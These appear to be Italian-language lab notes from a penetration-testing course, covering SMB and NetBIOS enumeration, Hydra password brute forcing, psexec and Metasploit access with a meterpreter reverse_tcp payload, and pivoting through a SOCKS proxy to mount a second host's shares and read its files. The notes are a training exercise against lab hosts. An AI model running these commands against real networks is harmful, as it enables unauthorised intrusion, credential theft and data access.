# Host & Network Penetration Testing: Network Based Attacks

## SMB & NetBIOS Enumeration

Windows Enumeration

### Netbios Enumeration

Di seguito un elenco di SW utili per fare scan delle reti con Netbios.

#### Nbtscan

```
nbtscan
whatis nbtscan
nbtscan 10.4.30.0/24
```

#### Nmblookup

```
nmblookup -A 10.4.30.139
// proviamo a usare un nmap scan con script per avere più info sulla porta NetBIOS
nmap -sU -sV -T4 --script nbstat.nse -p137 -Pn -n 10.4.30.139
```

#### nbtstat

```
nbtstat --help
```

### SMB Enumeration

#### Verifica se porta è aperta e versione

```
nmap -sV -p 139,445 demo.ine.local
```

#### Enumerazione con script nmap

```
// Per controllare gli script di nmap:
ls -al /usr/share/nmap/scripts/ | grep -e "smb-*"
// Utilizziamo il motore nmap scripting engine per enumerare la versione di SMB:
nmap -p455 --script smb-protocols demo.ine.local
```

#### Verificare il livello di sicurezza di SMB configurato

```
nmap -p445 --script smb-security-mode demo.ine.local
```

Questo ci può dire che lo script è stato eseguito come guest, livello di autenticazione "utente", è supportato e la firma dei messaggi è disabilitata. In tal caso si può accedere come guest user, che è un utente di default in tutte le versioni di windows.

#### Per testare specifiche vulnerabilità legate a SMB v1 come anonymous access

```
smbclient -L demo.ine.local //e premiamo enter senza inserire una password per testare l'accesso anonimo
```

#### Enumerazione degli utenti del PC Windows

Possibile nel caso in cui abbiamo anonymous access con SMB v1

```
nmap -p445 --script smb-enum-users.nse 10.4.30.139
```

#### Brute force delle password degli utenti

Usiamo Hydra come tool, ma potremmo usare anche crackmapexec

```
hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt demo.ine.local smb
```

### Colleghiamoci alla vittima con le credenziali trovate via SMB

#### Usando psexec.py

```
psexec.py administrator@demo.ine.local //e inseriamo la password
//e possiamo poi fare un po' di local enumeration
whoami
```

#### Usando il modulo psexec di MSF

```
msfconsole -q
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS demo.ine.local
set SMBUser administrator
set SMBPass password1
set payload windows/x64/meterpreter/reverse_tcp
exploit
sysinfo
```

### Pivoting su secondo target in altra rete

#### Impostiamo un system-wide proxy per poter raggiungere la seconda vittima (demo1) facendo pivoting sulla prima (demo)

```
ping 10.4.26.4
// funziona quindi terminiamo la sessione CMD sul target 1
// per tornare a quella meterpreter e configurare l'autoroute e fare il pivoting
run autoroute -s 10.4.26.0/20
background //mettiamo in background la sessione
// impostiamo un system-wide proxy con il modulo MSF metasploit proxy module
//verifichiamo su un altro terminale la versione di proxychains installata e la porta configurata con: cat /etc/proxychains.conf o /etc/proxychains4.conf
search socks
use auxiliary/server/socks_proxy
show options
set VERSION 4a //perché usiamo socks4
set SRVPORT 9050 //perché è quella configurata in /etc/proxychains4.conf
exploit
// ora che abbiamo un system-wide proxy possiamo fare una verifica spostandoci in un altro terminale:
```

#### Enumeration delle shares della seconda vittima demo1.ine.local, le montiamo sulla prima vittima e ne accediamo al contenuto

```
// ora che abbiamo un system-wide proxy possiamo fare una verifica spostandoci in un altro terminale:
    netstat -antp //e troviamo la porta 9050 in ascolto sul sistema
    proxychains nmap demo1.ine.local -sT -Pn -sV -p 445 //ora è raggiungibile dal sistema kali attaccante. -sT è per standard TCP connect scan
    //e troviamo un sistema windows running sul target demo1.
// torniamo sulla sessione iniziale in meterpreter (quella dentro demo.ine.local) sul terminale 1 e 
//   vediamo se riusciamo a interagire con il secondo target demo1.ine.local
sessions 2
shell
net view 10.4.26.4
// ci dà errore quindi proviamo a terminare con CTRL+C la sessione cmd per tornare a quella meterpreter
migrate -N explorer.exe
shell 
net view 10.4.26.4 //ed ora ci dà un risultato con le shares condivise da demo1
//assegniamo ora delle lettere (Drive letters) a ognuna delle cartelle condivise da demo1, per navigarle dal file system di demo
net use D: \\10.4.26.4\Documents
net use K: \\10.4.26.4\K$
dir D:  //così vediamo che in D c'è un file Confidential.txt e FLAG2.txt
dir K:  //così vediamo che in K c'è un altro file txt
```

Siamo riusciti ad accedere ai file della seconda vittima (demo1) montando le cartelle condivise (le shares) sulla prima vittima (demo) a cui avevamo ottenuto accesso tramite psexec a seguito del brute force delle credenziali.

## SNMP Enumeration

